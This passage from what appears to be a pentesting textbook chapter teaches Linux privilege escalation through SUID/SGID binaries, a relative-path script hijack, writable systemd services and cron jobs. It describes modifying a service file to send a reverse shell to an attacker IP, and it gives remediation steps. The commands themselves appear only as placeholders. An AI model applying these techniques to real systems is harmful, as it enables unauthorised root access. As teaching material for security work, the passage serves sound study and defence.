+- en: '![Figure 11.29 – Group ownership belongs to the root group](image/B22229_11_29.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 11.29 – Group ownership belongs to the root group
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Linux special file permissions extend beyond the basic read, write, and execute
+    permissions. Two key special permissions are the SUID and SGID bits:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '**SUID** : When applied to an executable file, SUID allows the file to run
+    with the privileges of the file’s owner, rather than the user executing it. It’s
+    represented by **s** in the owner’s execute permission field.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: 'To set SUID, enter this command: **ch mod** **u+s filename** .'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'To set SUID using numeric representation, enter this command: **chmod** **4000
+    filename** .'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'When examining file permissions, the following figure demonstrates the permissions
+    of a file with SUID:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 11.30 – File permissions reveal it is SUID](image/B22229_11_30.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 11.30 – File permissions reveal it is SUID
+  prefs: []
+  type: TYPE_NORMAL
+- en: '**SGID** : SGID works similarly to SUID but for groups. When set on an executable,
+    it runs with the privileges of the file’s group. On directories, it causes new
+    files created within to inherit the group of the parent directory.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: 'To set SGID, enter this command: **chmod** **g+s filename** .'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'To set SGID using numeric representation, enter this command: **chmod** **2000
+    filename** .'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'When examining file permissions, the following figure demonstrates the permissions
+    of a file with SGID:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 11.31 – File permissions reveal it is SGID](image/B22229_11_31.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 11.31 – File permissions reveal it is SGID
+  prefs: []
+  type: TYPE_NORMAL
+- en: These permissions are relevant to privilege escalation in several ways. If a
+    vulnerable SUID binary owned by **root** can be exploited, it may lead to privilege
+    escalation. SGID is similar to SUID, except escalating to the privileges of a
+    specific group. If an attacker can modify these binaries, they can insert malicious
+    code to be executed with elevated privileges. Unnecessary SUID or SGID bits on
+    executables increase the attack surface.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'To find SUID and SGID binaries, use the following Bash commands:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE15]'
+  prefs: []
+  type: TYPE_PRE
+- en: These commands search the entire filesystem starting at the top level **/**
+    for files ( **-type f** ) with SUID ( **-u=s** ) or SGID ( **-g=s** ) bits set.
+    The **2>/dev/null** expression redirects error messages to **/dev/null** , suppressing
+    permission-denied errors. The **/dev/null** file is essentially a trashcan with
+    a black hole at the bottom. Anything that is sent to this special place is discarded.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Let’s run these commands on the target system and compare the output. The following
+    figure shows the partial output of the command that searches for SUID files:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 11.32 – Partial output of a list of SUID files](image/B22229_11_32.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 11.32 – Partial output of a list of SUID files
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'In the output on the target system, there are two interesting matches found
+    in the user’s home directories. This is shown in the following figure:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 11.33 – Specific SUID files from our search are examined](image/B22229_11_33.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 11.33 – Specific SUID files from our search are examined
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Taking a look at the **/home/user3/shell** file, we run the **file** command
+    and find that it’s a compiled executable, as shown in the following figure:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 11.34 – The file command on shell shows that it’s a compiled ELF executable](image/B22229_11_34.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 11.34 – The file command on shell shows that it’s a compiled ELF executable
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'There are Linux debugging programs that will trace the execution and print
+    system and library calls. However, we don’t need to make this any more complicated
+    than it is. If we run the **strings** command ( **strings /home/user3/shell**
+    ), we find a reference to a file, **./.script.sh** , as shown in the next figure:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 11.35 – The output of the strings command shows that it calls a shell
+    script file](image/B22229_11_35.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 11.35 – The output of the strings command shows that it calls a shell
+    script file
+  prefs: []
+  type: TYPE_NORMAL
+- en: I check the contents of this file and it’s simply a taunt and doesn’t contain
+    anything useful. However, I see in the **strings** output that **.script.sh**
+    is called using its relative path, **./.script.sh** . This means that instead
+    of calling the absolute path of **/home/user3/.script.sh** , it’s called relative
+    to the current working directory. We can **cd** to the **/tmp** directory, create
+    a malicious version of **.script.sh** , and execute **/home/user3/shell** , which
+    will call the local copy of **.script.sh** , since we don’t have permission to
+    write to the original copy.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'The following figure demonstrates this process of exploiting the **/home/user3/shell**
+    SUID file to get a root shell:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 11.36 – Exploiting an SUID file to gain root privileges](image/B22229_11_36.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 11.36 – Exploiting an SUID file to gain root privileges
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Now that you’ve seen how dangerous SUID and SGID executables can be, let’s
+    talk about how to secure them to prevent exploitation. If we examine the file
+    permissions, we see that *others* can read and execute, as shown in the following
+    figure:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 11.37 – Examining the file permissions of the SUID shell](image/B22229_11_37.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 11.37 – Examining the file permissions of the SUID shell
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'It currently has the numeric file permissions of **4755** . To keep the SUID
+    set and secure the file from those who are not the **root** user or in the **root**
+    group, we can remediate this using the following command:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE16]'
+  prefs: []
+  type: TYPE_PRE
+- en: 'After entering this command, you can see in the following figure that anyone
+    other than **root** or a member of the **root** group can no longer execute this
+    file:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 11.38 – Entering the chmod command to remediate this vulnerable SUID
+    file](image/B22229_11_38.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 11.38 – Entering the chmod command to remediate this vulnerable SUID
+    file
+  prefs: []
+  type: TYPE_NORMAL
+- en: This concludes the topic of exploiting and securing SUID and SGID executables.
+    In the next section, you’ll learn about enumerating and exploiting misconfigured
+    services and scheduled tasks in Bash.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Leveraging misconfigured services and scheduled tasks
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: In cybersecurity, understanding how to enumerate, exploit, and secure misconfigured
+    services and cron jobs on Linux systems is essential. This section will guide
+    you through the process using Bash scripting, providing practical examples and
+    explanations.
+  prefs: []
+  type: TYPE_NORMAL
+- en: '**Systemd** is a system and service manager for Linux operating systems. It
+    is responsible for initializing the system, managing system processes, and handling
+    system services. Systemd services are essential components that define how various
+    applications and processes should be started, stopped, and managed.'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Systemd services are defined by unit files, which are configuration files that
+    describe how to manage a service or process. These unit files typically have a
+    **.service** extension and are located in directories such as **/etc/systemd/system/**
+    or **/lib/systemd/system/** . Each service unit file contains several sections
+    that specify the behavior of the service.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'To begin, we need to list all active services on the system. This can be achieved
+    using the **systemctl** command, as shown next:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE17]'
+  prefs: []
+  type: TYPE_PRE
+- en: This command lists all active services on the system.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Next, we need to check the permissions of these services to identify any misconfigurations.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Writable service files can be exploited by modifying them to execute malicious
+    code. The following command searches for writable files i n the **systemd** directory:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE18]'
+  prefs: []
+  type: TYPE_PRE
+- en: The output of this command doesn’t return any results on the target system.
+    However, let’s continue and learn how to modify writable service files if you
+    find one during your pentests. If a writable service file is found, it can be
+    modified to execute a reverse shell.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Here is an example of modifying a writable service file (replace **attacker_ip**
+    with the appropriate val ue from your Kali system):'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE19]'
+  prefs: []
+  type: TYPE_PRE
+- en: 'On your Kali system, execute the following command to be ready to receive the
+    reverse shell:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE20]'
+  prefs: []
+  type: TYPE_PRE
+- en: 'Then, reload the systemd manager configuration, as shown:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE21]'
+  prefs: []
+  type: TYPE_PRE
+- en: 'Restart the vulnerable service, as shown:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE22]'
+  prefs: []
+  type: TYPE_PRE
+- en: This should result in receiving a reverse shell from the target.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Now that you’ve learned how to enumerate and exploit vulnerable services, let’s
+    move ahead and examine **cron jobs** .
+  prefs: []
+  type: TYPE_NORMAL
+- en: Cron jobs are scheduled tasks that run automatically at specified intervals
+    on Unix-like operating systems. They are managed by the **cron daemon** , a background
+    process that executes commands at predetermined times and dates. In cybersecurity,
+    cron jobs can be invaluable for automating routine tasks, monitoring systems,
+    and maintaining security protocols. Cron jobs can be exploited if misconfigured.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'The following Bash command is used to examine scheduled tasks on a Linux system,
+    specifically, to identify potential privilege escalation opportunities related
+    to cr on jobs and scheduled tasks:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE23]'
+  prefs: []
+  type: TYPE_PRE
+- en: By running this command, you are looking for all scheduled tasks ( **cron**
+    jobs, **at** jobs, and **anacron** jobs) that are configured on the system, excluding
+    any commented lines.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'The output of this command on the target system can be seen in the following
+    figure:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 11.39 – The output of the command that examines scheduled tasks](image/B22229_11_39.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 11.39 – The output of the command that examines scheduled tasks
+  prefs: []
+  type: TYPE_NORMAL
+- en: You can see in the figure that **autoscript.sh** is running as **root** .
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'The **autoscript.sh** entry was also discovered earlier in the chapter, as
+    seen in the **pspy64** command output, shown here:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 11.40 – The pspy64 command output reveals the autoscript.sh entry
+    running as root](image/B22229_11_40.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 11.40 – The pspy64 command output reveals the autoscript.sh entry running
+    as root
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'We examine the **autoscript.sh** file content to find what it’s executing,
+    as shown in the following figure:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 11.41 – Examining the content of autoscript.sh to understand its purpose](image/B22229_11_41.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 11.41 – Examining the content of autoscript.sh to understand its purpose
+  prefs: []
+  type: TYPE_NORMAL
+- en: We see that it seems to be incomplete, according to the remark. However, it
+    does execute an interactive shell with the **bash -** **i** command.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'When examining the file permissions, we find that **user6** doesn’t have permission
+    to write to the file, and it’s not SUID:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 11.42 – Examining the autoscript.sh file permissions](image/B22229_11_42.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 11.42 – Examining the autoscript.sh file permissions
+  prefs: []
+  type: TYPE_NORMAL
+- en: From this perspective, we’ll need to have a shell as **user4** or obtain the
+    password for the account to exploit this privilege escalation vector. We have
+    neither in this scenario.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Securing vulnerable services and cron jobs is approached in the same way that
+    we previously secured SUID and SGID executables, by examining file permissions
+    and ensuring that unauthorized users do not have access to edit or run them.
+  prefs: []
+  type: TYPE_NORMAL
+- en: By following these steps, you can enumerate and exploit misconfigured services
+    and cron jobs on Linux systems using Bash scripting. Understanding these vulnerabilities
+    helps in securing systems against potential attacks.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Summary
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: This chapter was dedicated to exploring the techniques and strategies for achieving
+    privilege escalation through the Bash shell in pentesting scenarios. It focused
+    on identifying and exploiting system vulnerabilities and misconfigurations that
+    could lead to elevated privileges in a Linux Bash environment.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Linux systems are frequently used to serve web applications. Knowledge of how
+    to escalate privileges would be valuable to a pentester who has exploited a web
+    application and gained a low-privilege shell.
+  prefs: []
+  type: TYPE_NORMAL
+- en: The next chapter will examine post-exploitation persistence and pivoting in
+    a Linux Bash environment.
+  prefs: []
+  type: TYPE_NORMAL
